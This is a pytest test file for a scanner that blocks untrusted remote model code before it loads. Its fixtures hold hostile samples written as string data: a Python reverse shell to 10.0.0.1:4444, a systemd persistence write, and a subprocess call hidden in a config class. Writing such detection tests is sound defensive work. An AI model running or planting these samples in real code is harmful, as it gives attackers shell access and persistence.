# SPDX-License-Identifier: AGPL-3.0-only
# Copyright 2026-present the Unsloth AI Inc. team. All rights reserved. See /studio/LICENSE.AGPL-3.0

"""Tests for the trust_remote_code consent gate.

The gate runs on the LOAD path right before a load would pass
``trust_remote_code=True``. It scans the repo's ``auto_map`` Python and refuses
code flagged CRITICAL/HIGH unless the user pinned approval of this exact code
version. The scanner + fingerprint run for real here; only the config/file
fetch is stubbed (no network).
"""

from pathlib import Path
from unittest.mock import patch

import pytest

import utils.security.consent as consent
from utils.security import evaluate_remote_code_consent, RemoteCodeDecision


# HIGH severity (persistence install) - a single strong signal that blocks only
# untrusted third-party repos; first-party repos load through.
_HIGH = {
    "modeling_persist.py": (
        "open('/etc/systemd/system/x.service', 'w').write('[Service]\\nExecStart=sh')\n"
    )
}
# CRITICAL severity (reverse shell) - blocks even a first-party repo.
_CRITICAL = {
    "modeling_backdoor.py": (
        "import socket, subprocess, os\n"
        "s = socket.socket(); s.connect(('10.0.0.1', 4444))\n"
        "os.dup2(s.fileno(), 0); subprocess.call(['/bin/sh', '-i'])\n"
    )
}
_BENIGN = {
    "modeling_ok.py": (
        "import torch\n"
        "class MyModel(torch.nn.Module):\n"
        "    def forward(self, x):\n"
        "        return x + 1\n"
    )
}


def _with_auto_map(files):
    """Patch the gate so auto_map is present and the given files are returned."""
    return (
        patch.object(consent, "_config_has_auto_map", return_value=True),
        patch.object(consent, "repo_remote_code_files", return_value=files),
    )


class TestConsentGate:
    def test_disabled_is_a_noop(self):
        d = evaluate_remote_code_consent("unsloth/X", trust_remote_code=False)
        assert isinstance(d, RemoteCodeDecision)
        assert d.has_remote_code is False and d.blocked is False

    def test_no_auto_map_is_noop(self):
        with patch.object(consent, "_config_has_auto_map", return_value=False):
            d = evaluate_remote_code_consent("unsloth/Plain", trust_remote_code=True)
        assert d.has_remote_code is False
        assert d.blocked is False
        assert "no-op" in d.reason

    def test_benign_remote_code_allowed(self):
        a, b = _with_auto_map(_BENIGN)
        with a, b:
            d = evaluate_remote_code_consent("unsloth/Good", trust_remote_code=True)
        assert d.has_remote_code is True
        assert d.blocked is False
        assert d.fingerprint  # still fingerprinted for pinning

    def test_high_third_party_blocked(self):
        # HIGH severity from an untrusted third-party repo -> blocked.
        a, b = _with_auto_map(_HIGH)
        with a, b:
            d = evaluate_remote_code_consent(
                "evil/Model", trust_remote_code=True, trusted_org=False
            )
        assert d.has_remote_code is True
        assert d.blocked is True
        assert d.max_severity == "HIGH"
        assert d.fingerprint
        # response payload is frontend-ready
        p = d.response_payload()
        assert p["error_kind"] == "remote_code_blocked"
        assert p["fingerprint"] == d.fingerprint
        assert p["findings"]

    def test_high_first_party_allowed(self):
        # Same HIGH patterns, but a first-party repo -> allowed (DeepSeek-OCR
        # / Kimi trip HIGH on eval/b64decode and must still load).
        a, b = _with_auto_map(_HIGH)
        with a, b:
            d = evaluate_remote_code_consent(
                "unsloth/DeepSeek-OCR", trust_remote_code=True, trusted_org=True
            )
        assert d.has_remote_code is True
        assert d.blocked is False
        assert "first-party" in d.reason

    def test_bare_subprocess_blocked_third_party(self):
        # A bare subprocess.Popen in a config __init__ -- ignored by the package
        # scanner, but model code must never shell out, so the gate blocks it.
        files = {
            "configuration.py": (
                "import subprocess\n"
                "class RemoteConfig:\n"
                "    def __init__(self):\n"
                "        subprocess.Popen(['xcalc'])\n"
            )
        }
        a, b = _with_auto_map(files)
        with a, b:
            d = evaluate_remote_code_consent(
                "third-party/custom-model", trust_remote_code=True, trusted_org=False
            )
        assert d.blocked is True
        assert d.max_severity == "HIGH"
        assert "subprocess" in d.findings_summary.lower()

    def test_critical_blocked_even_first_party(self):
        # CRITICAL (reverse shell) blocks even a trusted first-party repo.
        a, b = _with_auto_map(_CRITICAL)
        with a, b:
            d = evaluate_remote_code_consent(
                "unsloth/Compromised", trust_remote_code=True, trusted_org=True
            )
        assert d.blocked is True
        assert d.max_severity == "CRITICAL"

    def test_approved_fingerprint_unblocks(self):
        a, b = _with_auto_map(_CRITICAL)
        with a, b:
            d1 = evaluate_remote_code_consent(
                "evil/Model", trust_remote_code=True, trusted_org=False
            )
            d2 = evaluate_remote_code_consent(
                "evil/Model",
                trust_remote_code=True,
                trusted_org=False,
                approved_fingerprint=d1.fingerprint,
            )
        assert d1.blocked is True
        assert d2.blocked is False
        assert d2.reason == "approved by fingerprint"

    def test_wrong_fingerprint_still_blocked(self):
        a, b = _with_auto_map(_CRITICAL)
        with a, b:
            d = evaluate_remote_code_consent(
                "evil/Model",
                trust_remote_code=True,
                trusted_org=False,
                approved_fingerprint="deadbeef",
            )
        assert d.blocked is True

    def test_fingerprint_changes_when_code_changes(self):
        (fn, body), = _HIGH.items()
        a1, b1 = _with_auto_map(_HIGH)
        with a1, b1:
            d1 = evaluate_remote_code_consent(
                "evil/Model", trust_remote_code=True, trusted_org=False
            )
        tampered = {fn: body + "\n# changed\n"}
        a2, b2 = _with_auto_map(tampered)
        with a2, b2:
            d2 = evaluate_remote_code_consent(
                "evil/Model", trust_remote_code=True, trusted_org=False
            )
        assert d1.fingerprint != d2.fingerprint  # pinned approval would re-prompt

    def test_unscannable_auto_map_allowed_with_warning(self):
        # auto_map present but code could not be fetched (gated/offline).
        with patch.object(consent, "_config_has_auto_map", return_value=True), patch.object(
            consent, "repo_remote_code_files", return_value={}
        ):
            d = evaluate_remote_code_consent("unsloth/Gated", trust_remote_code=True)
        assert d.has_remote_code is True
        assert d.blocked is False
        assert "unscannable" in d.reason


class TestWorkersWireTheGate:
    """Each load worker must call the gate and emit a remote_code_blocked error."""

    @pytest.mark.parametrize(
        "rel",
        [
            "core/training/worker.py",
            "core/inference/worker.py",
            "core/export/worker.py",
        ],
    )
    def test_worker_invokes_gate(self, rel):
        src = (Path(__file__).resolve().parent.parent / rel).read_text()
        assert "evaluate_remote_code_consent" in src
        assert "remote_code_blocked" in src
        assert ".blocked" in src


class TestCanonicalScannerSource:
    """Single source of truth: in-repo, the load-time scanner must be the
    canonical scripts/scan_packages.py (the CI scanner), not the fallback."""

    def test_canonical_scanner_loads_in_repo(self):
        from utils.security.remote_code_scan import _load_canonical_scanner

        canon = _load_canonical_scanner()
        assert canon is not None, "scripts/scan_packages.py must load in-repo"
        assert hasattr(canon, "check_py_file")

    def test_gate_uses_canonical_combination_heuristics(self):
        # Combination heuristics are unique to the canonical scanner: a
        # reverse-shell payload is CRITICAL there, proving it (not the flat
        # fallback) is in effect.
        from utils.security.remote_code_scan import scan_remote_code_files

        r = scan_remote_code_files(_CRITICAL)
        assert r.max_severity == "CRITICAL"
